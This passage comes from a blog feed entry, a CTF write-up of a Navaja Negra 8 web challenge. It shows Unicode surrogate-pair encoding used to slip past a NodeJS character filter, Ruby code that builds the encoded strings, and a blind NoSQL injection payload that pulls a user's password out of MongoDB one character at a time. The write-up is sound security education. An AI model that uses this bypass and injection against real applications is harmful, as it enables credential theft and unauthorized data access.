&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;H&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD800&lt;/span&gt;  
&lt;span class=&quot;nx&quot;&gt;L&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDC00&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, at this point a hint is released, the hint are some emojis, so it’s clear, we need some Unicode trick to bypass NodeJS checks. But, do not forget, those unicodes needs to make sense for MongoDB, which is the final endpoint of our string.&lt;/p&gt;

&lt;h3 id=&quot;error-error-error-error-victory&quot;&gt;Error, error, error, error, victory!&lt;/h3&gt;
&lt;p&gt;After a lot of testing and a key of my man X-C3LL, seems that MongoDB is reading the least significant byte of each surrogate pair, well, let’s test if this is true using &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;||&quot;1&quot;==&quot;1&lt;/code&gt; payload,  but remember, we can’t just use &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;, so we need to figure out a unicode which contains 0x22 and 0x7C as their least significant bytes of each surrogate pair.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# This receives a string of two characters, and looks for a unicode hex who's surrogate pairs least significant byte, match each character hex representation.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;uni&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFFFFF&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDC00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'U'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;A return without the URI encode for the string &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;|&lt;/code&gt;, the unicode &lt;code class=&quot;highlighter-rouge&quot;&gt;\u{1887c}&lt;/code&gt;  when divided in surrogate pairs:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;H: 0xD822
L: 0xDC7C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Their least significant byte’s match with &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;and &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; respectively.&lt;/p&gt;

&lt;p&gt;So we got some restrictions to bypass using this trick, those restrictions are the characters forbidden by backend controller, a bit of code helps me to create strings based on this trick for the restricted characters:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Takes pairs of characters where a forbidden char is and&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# converts it to unicode representation.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;convert_forbidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;false&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$waf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uni&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;false&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%2F&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%5B&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%5D&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%26&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For the string &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;||&quot;1==&quot;1&lt;/code&gt; this returns: &lt;code class=&quot;highlighter-rouge&quot;&gt;%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Testing on the live application, it works!! &lt;code class=&quot;highlighter-rouge&quot;&gt;/avatar/%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1&lt;/code&gt; returns 1.jpg, the same process but using “1”==”0” instead of “1” ==”1” returns us 404.jpg. So we can confirm the injection.&lt;/p&gt;

&lt;h3 id=&quot;exploiting-blind-nosql-injection&quot;&gt;Exploiting Blind NoSQL Injection&lt;/h3&gt;
&lt;p&gt;Now we need to write a bit more code to exfiltrate data, byte by byte. After some digging and refresh of MongoDB basics, it ended up on this payload:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pikachu&quot;&amp;amp;&amp;amp;(this.password.match(/^_string_/))==&quot;_string_&quot;||&quot;1&quot;==&quot;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will return true only if the string starts with the &lt;em&gt;string&lt;/em&gt; value. Look at the script to get more details if you are unfamiliar with Blind techniques.&lt;/p&gt;

&lt;h4 id=&quot;run-and-gimme-the-flag&quot;&gt;Run and gimme the flag!&lt;/h4&gt;
&lt;p&gt;Running the final script starts exfiltrating us the password for the user pikachu, character by character, but we know that flag starts with &lt;code class=&quot;highlighter-rouge&quot;&gt;nn8ed{&lt;/code&gt;, so some work is done:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Found! nn8ed{T
Found! nn8ed{Th
Found! nn8ed{Thi
... (lot of time)
Found! nn8ed{This.Old.Challenge.With.Unic0de}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So there’s the flag. Super funny challenge, I learned a lot about how NodeJS 8 works with Unicode and how inconsistencies at encoding treatment can compromise a system.&lt;/p&gt;

&lt;p&gt;Congratz to ka0labs.org for this great challenge!&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="ctf" />
      
        <category term="nn8ed" />
      
        <category term="nodejs" />
      
        <category term="bypass" />
      
        <category term="unicode" />
      

      

      
        <summary type="html">This weekend, Navaja Negra 8 CTF started, organized by ka0labs.org. This web challenge has the following statement:</summary>
      

      
      
    </entry>
  
  
</feed>
